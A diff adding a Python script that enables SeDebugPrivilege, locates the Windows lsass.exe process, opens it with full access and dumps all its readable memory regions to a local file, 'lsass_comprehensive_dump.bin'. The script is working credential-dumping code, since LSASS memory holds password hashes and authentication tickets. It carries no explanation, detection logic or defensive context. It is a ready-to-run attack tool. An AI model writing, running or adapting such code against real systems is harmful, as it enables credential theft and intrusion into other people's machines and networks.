@@ -1,0 +1,178 @@
+import ctypes
+import win32api
+import win32security
+import win32con
+import sys
+import struct
+import platform
+import psutil
+import os
+
+# Constants
+PROCESS_ALL_ACCESS = 0x1F0FFF
+PAGE_READWRITE = 0x04
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+
+# Define ctypes types
+HANDLE = ctypes.c_void_p
+LPVOID = ctypes.c_void_p
+LPCVOID = ctypes.c_void_p
+SIZE_T = ctypes.c_size_t
+DWORD = ctypes.c_ulong
+BOOL = ctypes.c_bool
+
+# Define MEMORY_BASIC_INFORMATION structure
+class MEMORY_BASIC_INFORMATION(ctypes.Structure):
+    _fields_ = [
+        ("BaseAddress", LPVOID),
+        ("AllocationBase", LPVOID),
+        ("AllocationProtect", DWORD),
+        ("RegionSize", SIZE_T),
+        ("State", DWORD),
+        ("Protect", DWORD),
+        ("Type", DWORD),
+    ]
+
+def enable_debug_privilege():
+    try:
+        privilege = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
+        token_handle = win32security.OpenProcessToken(
+            win32api.GetCurrentProcess(),
+            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
+        )
+        privileges = [(privilege, win32security.SE_PRIVILEGE_ENABLED)]
+        win32security.AdjustTokenPrivileges(token_handle, False, privileges)
+        win32api.CloseHandle(token_handle)
+        print("SeDebugPrivilege enabled.")
+    except Exception as e:
+        print(f"Failed to enable SeDebugPrivilege: {e}")
+        sys.exit(1)
+
+def get_pid(process_name):
+    """Dynamically retrieve the PID of a process by name."""
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
+            return proc.info['pid']
+    return None
+
+def main():
+    # Print Python and Platform Architecture
+    python_arch = '64-bit' if struct.calcsize("P") * 8 == 64 else '32-bit'
+    platform_arch = platform.architecture()[0]
+    print(f"Python Architecture: {python_arch}")
+    print(f"Platform Architecture: {platform_arch}")
+
+    # Enable SeDebugPrivilege
+    enable_debug_privilege()
+
+    # Retrieve PIDs dynamically
+    LSASS_PID = get_pid('lsass.exe')
+    NOTEPAD_PID = get_pid('notepad.exe')  # Not needed for dumping to file
+
+    if not LSASS_PID:
+        print("Could not find lsass.exe.")
+        sys.exit(1)
+
+    # Open lsass.exe process
+    try:
+        lsass_handle = win32api.OpenProcess(PROCESS_ALL_ACCESS, False, LSASS_PID)
+        lsass_handle_int = int(lsass_handle)
+        print(f"Opened lsass.exe with PID {LSASS_PID}, Handle: {hex(lsass_handle_int)}")
+    except Exception as e:
+        print(f"Failed to open lsass.exe: {e}")
+        sys.exit(1)
+
+    # Load kernel32.dll
+    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+
+    # Define VirtualQueryEx
+    VirtualQueryEx = kernel32.VirtualQueryEx
+    VirtualQueryEx.argtypes = [HANDLE, LPCVOID, ctypes.POINTER(MEMORY_BASIC_INFORMATION), SIZE_T]
+    VirtualQueryEx.restype = SIZE_T
+
+    # Define ReadProcessMemory
+    ReadProcessMemory = kernel32.ReadProcessMemory
+    ReadProcessMemory.argtypes = [HANDLE, LPCVOID, LPVOID, SIZE_T, ctypes.POINTER(SIZE_T)]
+    ReadProcessMemory.restype = BOOL
+
+    # Function to find all readable memory regions in lsass.exe
+    def find_all_readable_regions():
+        regions = []
+        memory_info = MEMORY_BASIC_INFORMATION()
+        address = 0
+        max_address = 0x7fffffffffff  # User-mode memory limit on Windows
+
+        print("Scanning all memory regions in lsass.exe for readable areas...")
+
+        while address < max_address:
+            bytes_returned = VirtualQueryEx(
+                HANDLE(lsass_handle_int),
+                LPCVOID(address),
+                ctypes.byref(memory_info),
+                ctypes.sizeof(memory_info)
+            )
+
+            if bytes_returned == 0:
+                break  # No more regions to query
+
+            # Check if the memory region is committed and readable
+            if (memory_info.State == MEM_COMMIT and
+                memory_info.Protect in (
+                    win32con.PAGE_READONLY,
+                    win32con.PAGE_READWRITE,
+                    win32con.PAGE_EXECUTE_READ,
+                    win32con.PAGE_EXECUTE_READWRITE
+                )):
+                regions.append((memory_info.BaseAddress, memory_info.RegionSize))
+
+            address += memory_info.RegionSize
+
+        print(f"Found {len(regions)} readable memory regions in lsass.exe.")
+        return regions
+
+    # Find all readable memory regions in lsass.exe
+    readable_regions = find_all_readable_regions()
+
+    if not readable_regions:
+        print("No readable memory regions found in lsass.exe.")
+        win32api.CloseHandle(lsass_handle)
+        sys.exit(1)
+
+    # Define the output dump file
+    dump_file = "lsass_comprehensive_dump.bin"
+
+    try:
+        with open(dump_file, "wb") as f:
+            for idx, (base, size) in enumerate(readable_regions):
+                print(f"Dumping region {idx+1}: Address={hex(base)}, Size={size} bytes")
+                buffer = ctypes.create_string_buffer(size)
+                bytes_read = SIZE_T()
+
+                success = ReadProcessMemory(
+                    HANDLE(lsass_handle_int),
+                    LPCVOID(base),
+                    buffer,
+                    size,
+                    ctypes.byref(bytes_read)
+                )
+
+                if not success:
+                    error_code = ctypes.get_last_error()
+                    print(f"Failed to read region {idx+1} at {hex(base)}. Error code: {error_code}")
+                    continue  # Skip to the next region
+
+                # Write the read bytes to the file
+                f.write(buffer.raw[:bytes_read.value])
+                print(f"Dumped {bytes_read.value} bytes from region {idx+1}.")
+    except Exception as e:
+        print(f"Failed to write dump to file: {e}")
+
+    print(f"Successfully dumped lsass.exe memory to {dump_file}")
+
+    # Cleanup
+    win32api.CloseHandle(lsass_handle)
+    print("Handles closed. Comprehensive dump complete.")
+
+if __name__ == "__main__":
+    main()
